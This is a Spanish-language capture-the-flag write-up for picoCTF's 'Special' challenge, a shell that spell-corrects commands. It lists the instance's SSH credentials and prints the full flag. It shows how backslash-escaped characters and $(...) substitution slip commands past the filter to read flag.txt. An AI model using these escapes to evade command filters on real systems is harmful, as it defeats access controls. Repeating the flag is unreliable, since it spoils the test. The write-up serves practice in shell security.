## Descripción
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)

Start your instance to see connection details.

Additional details will be available after launching your challenge instance.

`ssh -p 61944 ctf-player@saturn.picoctf.net`
The password is `d8819d45`

## Pistas
Experiment with different shell syntax


## Solución 1
Utilizando caracteres de escape y comandos interpolados.
```shell

Special$ $(ls)  

$(ls) 

sh: 1: blargh: not found

Special$ $(ls \b\l\a\r\g\h)

Pals \b\l\a\r\g\h) 

sh: 1: Syntax error: ")" unexpected

Special$ ls  

Is 

sh: 1: Is: not found

Special$ \c\a\t \b\l\a\r\g\/\f\l\a\g\.\t\x\t

\c\a\t \b\l\a\r\g\/\f\l\a\g\.\t\x\t 

cat: blarg/flag.txt: No such file or directory

Special$ \c\a\t \b\l\a\r\g\h\/\f\l\a\g\.\t\x\t

\c\a\t \b\l\a\r\g\h\/\f\l\a\g\.\t\x\t
picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}
```


## Notas adicionales
En el archivo `/etc/crontab` se puede ver una lista de acciones programadas utilizando `cron` de Linux

## Referencias
